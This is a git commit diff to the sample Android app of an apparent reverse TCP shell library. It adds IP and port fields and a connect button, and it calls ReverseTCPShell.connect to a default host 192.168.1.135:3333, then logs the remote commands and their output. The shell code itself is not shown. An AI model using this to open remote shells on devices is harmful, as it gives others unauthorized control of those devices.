833eff5814f0bae5561570334d59c2d37ce388a6
龙英豪 <longyinghao@ycmedia.cn>
2017-06-14 17:53:23 +0800

    sample更新，更易懂

--- sample/src/main/java/com/evil/reversetcpshellandroid/sample/MainActivity.java
+++ sample/src/main/java/com/evil/reversetcpshellandroid/sample/MainActivity.java
@@ -5,6 +5,8 @@ import android.os.Bundle;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.BaseAdapter;
+import android.widget.Button;
+import android.widget.EditText;
 import android.widget.ListView;
 import android.widget.TextView;
 
@@ -17,10 +19,12 @@ import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     private TextView textView;
+    private EditText ipEditText, portEditText;
     private ListView listView;
     List<String> logList = new ArrayList<>();
     private MyAdapter myAdapter;
     private ReverseTCPShell mShell;
+    private Button button;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -28,39 +32,94 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         textView = (TextView) findViewById(R.id.text_view);
         listView = (ListView) findViewById(R.id.list_view);
-        logList.clear();
+        button = (Button) findViewById(R.id.button);
+        ipEditText = (EditText) findViewById(R.id.ip_edit);
+        portEditText = (EditText) findViewById(R.id.port_edit);
         myAdapter = new MyAdapter();
         listView.setAdapter(myAdapter);
-        final String ip = "192.168.1.135";
-        final int port = 3333;
+
+        //图方便
+        ipEditText.setText("192.168.1.135");
+        portEditText.setText("3333");
+
+        init();
+    }
+
+    private void init() {
+        reset();
+        button.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if (mShell == null) {
+                    reset();
+                    connect();
+                } else {
+                    reset();
+                }
+            }
+        });
+    }
+
+    private void reset() {
+        logList.clear();
+        if (mShell != null)
+            mShell.stop();
+        mShell = null;
+        resetView();
+    }
+
+    private void resetView() {
+        ipEditText.setEnabled(true);
+        portEditText.setEnabled(true);
+        button.setText("开始连接");
+        button.setEnabled(true);
+    }
+
+    private void connect() {
+        ipEditText.setEnabled(false);
+        portEditText.setEnabled(false);
+        textView.setText("连接中...");
+        button.setText("断开连接");
+        button.setEnabled(false);
+        doConnect();
+    }
+
+    private void doConnect() {
+        String ip = ipEditText.getText().toString().trim();
+        int port = Integer.valueOf(portEditText.getText().toString().trim());
         ReverseTCPShell.connect(ip, port, new ConnectListener() {
             @Override
             public void connected(ReverseTCPShell shell) {
                 mShell = shell;
-                addText("成功连接至 "+ip +":"+port);
+                button.setEnabled(true);
+                addText("成功连接");
             }
 
             @Override
             public void receiveMessage(String msg) {
-                addText("远程:\n"+msg);
+                addText("远程:\n" + msg);
             }
 
             @Override
             public void feedbackMessage(String msg) {
-                addText("反馈:\n"+msg);
+                addText("反馈:\n" + msg);
             }
 
             @Override
             public void stopped() {
                 addText("连接结束");
+                mShell = null;
+                reset();
             }
         }, new ConnectErrorListener() {
             @Override
             public void error(String msg) {
+                reset();
                 addText("连接错误\n" + msg);
             }
         });
     }
+
 
     public class MyAdapter extends BaseAdapter {
         @Override
@@ -87,7 +146,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void addText(String msg){
+    private void addText(String msg) {
         textView.setText(msg);
         logList.add(0, msg);
         myAdapter.notifyDataSetChanged();
